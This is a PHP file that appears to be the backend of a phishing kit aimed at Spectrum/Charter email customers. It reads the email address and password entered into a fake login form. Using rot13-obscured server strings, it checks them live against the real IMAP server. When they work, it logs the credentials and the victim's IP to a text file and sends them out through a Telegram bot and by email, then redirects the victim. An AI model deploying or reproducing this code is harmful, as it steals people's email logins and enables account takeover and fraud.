<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

$ip = getIp();
include('jokconf.php');
#####################################################
	function getIp()
	{
		$ip = '';
		if ($_SERVER['HTTP_CLIENT_IP']) $ip = $_SERVER['HTTP_CLIENT_IP'];
		else if ($_SERVER['HTTP_X_REAL_IP']) $ip = $_SERVER['HTTP_X_REAL_IP'];
		else if ($_SERVER['HTTP_CF_CONNECTING_IP']) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
		else if ($_SERVER['HTTP_X_FORWARDED']) $ip = $_SERVER['HTTP_X_FORWARDED'];
		else if ($_SERVER['HTTP_FORWARDED_FOR']) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
		else if ($_SERVER['HTTP_FORWARDED']) $ip = $_SERVER['HTTP_FORWARDED'];
		else if ($_SERVER['REMOTE_ADDR']) $ip = $_SERVER['REMOTE_ADDR'];
		else $ip = 'UNKNOWN';
		if ($ip == "::1") {
			return "127.0.0.1";
		}
		return $ip;
	}

#####################################################



$user = $_POST['emailAddress'];
$pass = $_POST['emailPassword'];



$charter = '/charter/i';
$rrnet = '/.rr.net/i';
$rrcom = '/.rr.com/i';

if (preg_match($charter, $user) == 1){
	$auch= str_rot13("{zbovyr.punegre.arg:993/vznc/ffy/abinyvqngr-preg}");
} else if (preg_match($rrnet, $user) == 1){
	$auch= str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
} else if (preg_match($rrcom, $user) == 1){
	$auch= str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
} else {
	$auch= str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
}


if (!empty($auch) && !empty($user) && !empty($pass) ){
if ($mbox=imap_open( $auch, $user, $pass )) {
         $ipdata = "Call Done";
         imap_close($mbox);
        } else {
         $ipdata = "FAIL!";
        }
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
if ($ipdata == "Call Done")
{
$message .= "------------[ Spectrum EMAIL Access Info ]-------------\n";
$message .= "Username    : ".$_POST['emailAddress']."\n";
$message .= "Password    : ".$_POST['emailPassword']."\n";
$message .= "------------[ VECTIM PC/INFO ]-------------\n";
$message .= "IP: $ip\n";
$message .= "---------Created Teeds --------------\n";
$subject = "Spectrum Email LOG - $ip";
$headers = "From: Spectrum REz0 <rzlt@mydomain.com>";
$fp = fopen("ice2nice.txt", "a");
fputs($fp, $message);
fclose($fp);
// ---------------- Telegram Rez ---------------- //
$token = $tokentele;
$data = [
    	'text' => $message,
    	'chat_id' => $chatid
		];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );	
mail($recipient,$subject,$message,$headers);
header("Location:security"); 
}
else {
header("Location:authen?error=1"); 
}
?>